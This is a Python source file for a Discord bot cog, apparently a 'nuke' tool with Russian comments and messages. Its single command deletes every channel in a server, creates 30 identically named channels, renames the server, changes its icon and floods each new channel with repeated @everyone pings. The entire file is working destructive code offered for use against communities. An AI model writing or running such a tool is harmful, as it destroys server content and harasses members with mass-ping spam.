import discord  
from discord.ext import commands
import asyncio

server_name = "креветки-рулят"
channels_name = "креветки-рулят"

class NukeCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def spam_channel(self, channel):
        for _ in range(19):
            try:
                await channel.send("@everyone КРЕВЕТКИ РУЛЯЯЯТ")
            except Exception as e:
                print(f"Ошибка при отправке сообщения в {channel.name}: {e}")
            await asyncio.sleep(0.1) 

    @commands.command(name='nuke')
    @commands.has_permissions(administrator=True)
    async def nuke(self, ctx):
        guild = ctx.guild

        await asyncio.gather(*(channel.delete() for channel in guild.channels))
        await asyncio.sleep(0.2)

        tasks = [guild.create_text_channel(channels_name) for _ in range(30)]
        new_channels = await asyncio.gather(*tasks)
        await asyncio.sleep(0.2)

        await guild.edit(name=server_name)
        await asyncio.sleep(0.2)

        for channel in new_channels:
            self.bot.loop.create_task(self.spam_channel(channel))

        # замени на свой путь аватарки
        try:
            with open("e:/shaizen-nuke/avatar.png", "rb") as image:
                icon_bytes = image.read()
            await guild.edit(icon=icon_bytes)
        except Exception as e:
            print(f"Ошибка при изменении аватарки сервера: {e}")
        await asyncio.sleep(0.2)

        await ctx.send("Server has been nuked!")

async def setup(bot: commands.Bot):
    await bot.add_cog(NukeCog(bot))
